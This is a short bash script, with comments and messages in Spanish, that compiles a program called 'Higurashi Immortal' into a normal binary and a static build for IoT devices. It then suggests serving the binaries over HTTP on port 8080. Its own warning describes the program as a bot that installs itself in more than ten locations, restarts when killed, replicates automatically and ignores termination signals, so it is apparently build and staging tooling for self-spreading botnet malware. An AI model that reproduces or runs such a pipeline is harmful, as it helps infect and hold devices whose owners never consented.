#!/bin/bash
# Compilar Higurashi Immortal

echo "🔥 Compilando Higurashi Immortal..."

# Compilar versión normal
gcc higurashi_immortal.c -o higurashi_immortal \
    -lpthread -lssl -lcrypto -ljson-c \
    -O2 -Wall -Wno-unused-result

if [ $? -eq 0 ]; then
    echo "✅ higurashi_immortal compilado"
    chmod +x higurashi_immortal
    
    # Compilar versión estática para IoT
    echo ""
    echo "📦 Compilando versión estática..."
    musl-gcc higurashi_immortal.c -o higurashi_immortal_static \
        -lpthread -lssl -lcrypto -ljson-c \
        -static -O2 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "✅ higurashi_immortal_static compilado"
        chmod +x higurashi_immortal_static
    else
        echo "⚠️  musl-gcc no disponible, saltando versión estática"
    fi
    
    echo ""
    echo "🎯 Binarios listos:"
    ls -lh higurashi_immortal*
    
    echo ""
    echo "📝 Para probar localmente:"
    echo "   ./higurashi_immortal"
    echo ""
    echo "📝 Para servir en red (puerto 8080):"
    echo "   python3 -m http.server 8080"
    echo ""
    echo "⚠️  ADVERTENCIA: Este bot tiene persistencia extrema"
    echo "   - Se instala en 10+ ubicaciones"
    echo "   - Se auto-reinicia si lo matas"
    echo "   - Se replica automáticamente"
    echo "   - Ignora SIGINT/SIGTERM"
    echo ""
    echo "🧹 Para eliminar completamente (si es tu máquina):"
    echo "   ./cleanup_immortal.sh"
    
else
    echo "❌ Error de compilación"
    exit 1
fi
